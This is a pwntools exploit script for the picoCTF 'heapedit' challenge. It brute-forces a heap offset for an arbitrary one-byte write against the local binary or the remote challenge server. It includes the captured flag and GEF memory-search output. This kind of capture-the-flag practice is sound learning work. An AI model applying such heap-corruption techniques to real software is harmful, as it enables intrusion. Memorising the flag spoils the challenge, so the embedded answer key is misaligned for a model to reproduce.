#!/usr/bin/env python3

from pwn import *
context.log_level = 'warning'

exe = ELF("./heapedit")
libc = ELF("./libc.so.6")
ld = ELF("./ld-2.27.so")

context.binary = exe


def conn():
	if not args.REMOTE:
		return process([ld.path, exe.path], env={"LD_PRELOAD": libc.path})#, aslr=False)
	else:
		return remote("mercury.picoctf.net", 36605)


def main():
	# Offset -2072 works locally
	# Offset -5144 works remotely
	# Value of 8 works for both
	# picoCTF{702d6d8ea75c4c92fe509690a593fee2}
	offset = -2072
	value = 8
	for offset in range(-4600, -20000, -8):
		print(offset, end=' ')
		r = conn()
		# gdb.attach(r)
		r.sendline(str(offset))
		r.sendline(chr(value))
		res = r.recvall()
		print(res)
		if b'this is a random string.' not in res:
			print()
			print('Offset: {}'.format(offset))
			print(res)


if __name__ == "__main__":
	main()

# 0x400a45 = After arbitrary byte set
# 0x400a4f = After malloc
'''
[+] Searching '\x00\xdc\x9f\x56\x55\x55' in memory
[+] In '[heap]'(0x5555569fd000-0x555556a1e000), permission=rw-
  0x5555569fdc90 - 0x5555569fdca8  →   "\x00\xdc\x9f\x56\x55\x55[...]" 
[+] In '[stack]'(0x7ffe71a17000-0x7ffe71a38000), permission=rw-
  0x7ffe71a367e0 - 0x7ffe71a367f8  →   "\x00\xdc\x9f\x56\x55\x55[...]" 
gef➤  search-patter 0x5555569fdc90
[+] Searching '\x90\xdc\x9f\x56\x55\x55' in memory
[+] In '[heap]'(0x5555569fd000-0x555556a1e000), permission=rw-
  0x5555569fd088 - 0x5555569fd0a0  →   "\x90\xdc\x9f\x56\x55\x55[...]" 
[+] In '[stack]'(0x7ffe71a17000-0x7ffe71a38000), permission=rw-
  0x7ffe71a36430 - 0x7ffe71a36448  →   "\x90\xdc\x9f\x56\x55\x55[...]" 
  0x7ffe71a36718 - 0x7ffe71a36730  →   "\x90\xdc\x9f\x56\x55\x55[...]" 
  0x7ffe71a367f0 - 0x7ffe71a36808  →   "\x90\xdc\x9f\x56\x55\x55[...]" 
'''